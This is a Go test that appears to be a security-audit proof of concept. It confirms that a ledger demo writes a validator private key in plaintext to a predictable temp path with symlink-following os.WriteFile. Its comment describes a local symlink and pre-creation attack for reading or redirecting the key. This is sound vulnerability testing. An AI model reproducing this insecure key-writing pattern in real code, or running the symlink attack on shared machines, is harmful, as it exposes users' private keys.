package main

import (
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// PoC (KEY-4): cmd/demo writes the demo FOUNDER private key (sole validator, 1000 units, full
// governance) to a PREDICTABLE path in os.TempDir() via os.WriteFile, which uses O_CREATE without
// O_EXCL and follows symlinks. On a shared machine (os.TempDir() == /tmp, world-writable+sticky) a
// local attacker who pre-creates that exact path can (a) make it a symlink so the write lands on a
// file the attacker chose, or (b) pre-create it with attacker-readable perms so WriteFile's 0600 is
// not applied to the already-existing file and the attacker reads the plaintext key. The key is also
// stored in the clear and never deleted when the demo exits.
func TestPoCDemoWalletPredictablePathAndSymlinkUnsafe(t *testing.T) {
	// 1) The path is predictable (os.TempDir()/go_ledger_demo_wallet.json) and content is plaintext.
	dir := t.TempDir()
	walletPath := filepath.Join(dir, "go_ledger_demo_wallet.json")
	pub := []byte("demo-public-key-bytes-xxxxxxxxxx")
	priv := []byte("demo-private-key-bytes-this-is-secret-64b-in-real-ed25519-keyyy!")
	if err := writeWallet(walletPath, pub, priv); err != nil {
		t.Fatal(err)
	}
	data, _ := os.ReadFile(walletPath)
	var k struct{ PrivateKey string }
	_ = json.Unmarshal(data, &k)
	if k.PrivateKey == "" {
		t.Fatal("expected the private key to be stored (in the clear)")
	}
	t.Logf("CONFIRMED: demo writes the validator private key in PLAINTEXT to a fixed basename in os.TempDir()")

	// 2) Symlink-unsafe: an attacker pre-creates the path as a symlink; writeWallet follows it and
	//    writes the secret key THROUGH the symlink to a target the attacker controls.
	victimTarget := filepath.Join(dir, "attacker-controlled-destination")
	linkPath := filepath.Join(dir, "link_wallet.json")
	if err := os.Symlink(victimTarget, linkPath); err != nil {
		t.Skipf("symlink unsupported here: %v", err)
	}
	if err := writeWallet(linkPath, pub, priv); err != nil {
		t.Fatal(err)
	}
	through, err := os.ReadFile(victimTarget)
	if err != nil {
		t.Fatalf("write did not follow the symlink (good, bug absent): %v", err)
	}
	var tk struct{ PrivateKey string }
	_ = json.Unmarshal(through, &tk)
	if tk.PrivateKey == "" || !strings.Contains(string(through), "privateKey") {
		t.Fatalf("symlink target does not hold the key: %q", string(through))
	}
	t.Logf("CONFIRMED: writeWallet (os.WriteFile, no O_EXCL) followed a pre-planted symlink and wrote the private key to the attacker-chosen target")
}
